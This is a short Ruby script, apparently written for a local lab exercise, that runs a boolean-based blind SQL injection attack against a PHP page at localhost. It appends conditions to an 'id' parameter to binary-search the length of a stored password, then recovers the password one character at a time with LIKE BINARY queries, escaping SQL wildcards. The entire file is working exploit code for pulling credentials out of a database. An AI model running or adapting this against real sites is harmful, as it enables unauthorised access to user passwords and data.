require 'open-uri'

END {    
    password_length = guess_value{ |value|
        URI.open("http://localhost:8000/active.php?id=4 and CHAR_LENGTH(password) > #{value}").read.include?  "is"
    }
    puts "the length is: #{password_length}"
    
    password = find_password(password_length){ |value|
        URI.open("http://localhost:8000/active.php?id=4 and password LIKE BINARY \"#{value}\"").read.include?  "is"
    }
    puts "the password is: #{password}"
}

SQL_WILDCARDS="%_[]^-'"
def guess_value
    max_value = 1
    max_value *= 2 while yield max_value
    min_value = max_value / 2
    puts "max: #{max_value} | min: #{min_value}"
    
    loop do
        value = (max_value - min_value) / 2 + min_value
        is_biggest = yield value
        if is_biggest
            min_value = value
        else
            max_value = value
        end 
        return max_value if (max_value - min_value) <= 1
    end
end

def find_password password_length
    # uri = "http://localhost/active.php?id=3 and length(password) like #{password}"
    value=""
    password_length.times do
        for i in 33..nil 
            char = SQL_WILDCARDS.include?(i.chr(Encoding::UTF_8))? "\\#{i.chr(Encoding::UTF_8)}" : i.chr(Encoding::UTF_8)
            result = yield URI.escape("#{value}#{char}%")
            print "\r#{value}#{char}"
            if result
                value += char
                break;                
            end
        end
    end
    return value
end